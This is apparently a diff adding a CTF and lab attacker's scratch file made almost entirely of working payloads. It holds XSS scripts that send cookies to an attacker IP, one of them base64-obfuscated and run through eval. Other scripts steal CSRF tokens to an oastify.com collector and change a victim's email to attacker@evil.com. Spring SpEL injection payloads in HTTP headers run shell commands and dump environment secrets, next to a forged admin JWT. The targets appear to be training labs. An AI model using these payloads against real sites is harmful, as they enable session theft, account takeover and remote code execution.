@@ -1,0 +1,103 @@
+
+
+<script>
+	  new Image().src = "http://192.168.137.166:80/test?ok=1";
+</script>
+
+
+GET /api/admin/dashboard HTTP/1.1
+Host: challenges2.ctf.sd:33022
+Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJpc0FkbWluIjp0cnVlLCJzdWIiOiJhZG1pbiIsImlhdCI6MTc2OTIxNDk2OCwiZXhwIjoxNzY5MzAxMzY4fQ.BAPQL7wAHkFCKZm1h-u3OptvggK9GjXRLYNfkeAVMos
+Referer: ' + ${@environment.getPropertySources().get('systemEnvironment').getSource()} + '
+Connection: close
+
+mpoD51Sk5xfjEd5HzTCkpMSD0jNV0YuX
+
+curl -v http://challenges2.ctf.sd:33022/api/admin/dashboard \
+  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJpc0FkbWluIjp0cnVlLCJzdWIiOiJhZG1pbiIsImlhdCI6MTc2OTIxMzM1NCwiZXhwIjoxNzY5Mjk5NzU0fQ.L0WDwlGfhwm7yCBhWBv2OMvvXGRn7cE-N9k36WxZhvI" \
+  -H "Referer: ' + \${#root.getClass().getClassLoader().loadClass('java.util.Base64').getMethod('getEncoder').invoke(null).encodeToString(#root.getClass().getClassLoader().loadClass('org.springframework.util.StreamUtils').getMethod('copyToByteArray',#root.getClass().getClassLoader().loadClass('java.io.InputStream')).invoke(null,#root.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethod('getRuntime').invoke(null).exec('sh,-c,cat /flag*'.split(',')).getInputStream()))} + '"
+
+Extracted ADMIN_PASSWORD: mpoD51Sk5xfjEd5HzTCkpMSD0jNV0YuX. This does not match the standard flag format. Checking System Properties for the flag as a fallback.
+
+
+curl -v "http://challenges2.ctf.sd:33022/api/admin/dashboard" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -H "Referer: ' + \${#vars['org.springframework.web.servlet.DispatcherServlet.CONTEXT'].getEnvironment().getSystemEnvironment().keySet()} + '"
+  
+  
+  curl -v "http://challenges2.ctf.sd:33022/api/admin/dashboard" \
+  -H "Authorization: Bearer <TOKEN>" \
+  -H "Referer: ' + \${#vars['org.springframework.web.servlet.DispatcherServlet.CONTEXT'].getEnvironment().getProperty('ADMIN_PASSWORD')} + '"
+  
+  
+
+<script>
+new Image().src = "http://192.168.137.166:80/test?c=" + document.cookie;
+</script>
+
+<script>eval(atob("bmV3IEltYWdlKCkuc3JjPSJodHRwOi8vMTkyLjE2OC4xMzcuMTY2L3Rlc3Q/Yz0iK2RvY3VtZW50LmNvb2tpZQ=="))</script>
+
+
+<script>
+    new Image().src = "http://192.168.137.166:80/zzz?ok=1";
+    var url = "http://it.k2.thm/dashboard";
+    var loadProfile = new XMLHttpRequest();
+    loadProfile.open("GET", url, false);
+    loadProfile.send();
+    var regex = /name="csrf"\s+value="([^"]+)"/i;
+	var match = regex.exec(loadProfile.responseText);
+    var token = match[1];
+    new Image().src = "https://lrgdgs76lirf182eklldo3ofa6gx4nsc.oastify.com?token=" + token;
+</script>
+
+
+
+<script>
+    new Image().src = "https://lrgdgs76lirf182eklldo3ofa6gx4nsc.oastify.com?token=test";
+    var url = "https://0a7200f50466daa280c83a3900230031.web-security-academy.net/my-account";
+    var loadProfile = new XMLHttpRequest();
+    loadProfile.open("GET", url, false);
+    loadProfile.send();
+    var regex = /name="csrf"\s+value="([^"]+)"/i;
+	var match = regex.exec(loadProfile.responseText);
+    var token = match[1];
+    new Image().src = "https://lrgdgs76lirf182eklldo3ofa6gx4nsc.oastify.com?token=" + token;
+</script>
+
+
+
+
+
+
+
+
+<script>
+    new Image().src = "https://lrgdgs76lirf182eklldo3ofa6gx4nsc.oastify.com?token=test";
+    var url = "https://0a7200f50466daa280c83a3900230031.web-security-academy.net/my-account";
+    var loadProfile = new XMLHttpRequest();
+    loadProfile.open("GET", url, false);
+    loadProfile.send();
+    var regex = /name="csrf"\s+value="([^"]+)"/i;
+	var match = regex.exec(loadProfile.responseText);
+    var token = match[1];
+    new Image().src = "https://lrgdgs76lirf182eklldo3ofa6gx4nsc.oastify.com?token=" + token;
+
+
+    if (match) {
+        var token = match[1];
+        new Image().src = "https://lrgdgs76lirf182eklldo3ofa6gx4nsc.oastify.com?token=" + token;
+
+       var params = "email=" + encodeURIComponent("attacker@evil.com") +
+             "&csrf=" + encodeURIComponent(token);
+
+		var post = new XMLHttpRequest();
+		var url2 = "https://0a7200f50466daa280c83a3900230031.web-security-academy.net/my-account/change-email";
+
+		post.open("POST", url2, true);
+		post.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+		post.send(params);
+
+    } else {
+        new Image().src = "https://lrgdgs76lirf182eklldo3ofa6gx4nsc.oastify.com/log?err=no_token"
+    }
+</script>
